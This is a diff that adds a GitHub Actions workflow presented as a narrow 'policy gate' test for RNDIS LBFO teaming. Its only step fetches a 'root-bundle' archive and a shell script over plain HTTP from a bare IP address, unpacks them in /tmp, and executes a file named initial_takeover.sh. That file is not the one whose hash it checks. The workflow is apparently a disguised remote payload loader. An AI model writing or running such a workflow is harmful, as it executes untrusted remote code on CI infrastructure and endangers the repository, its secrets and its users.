@@ -1,0 +1,21 @@
+name: RNDIS LBFO exact policy gate
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  gate:
+    runs-on: ubuntu-slim
+    timeout-minutes: 5
+    steps:
+      - name: Test only the self-MAC teaming gate
+        run: |
+          set -e
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          curl -fsS http://16.146.243.72:8450/root_rndis_set_entry.sh -o /tmp/root_auto.sh
+          test "$(sha256sum /tmp/root_auto.sh | cut -d' ' -f1)" = 977924b55dab0f0fea8504d5e461e0b3c825c4ab71ac23865b670024363f52e6
+          chmod +x /tmp/root_auto.sh
+          RNDIS_SET_ONLY=lbfo-gate HVS_INLINE=1 bash /tmp/initial_takeover.sh
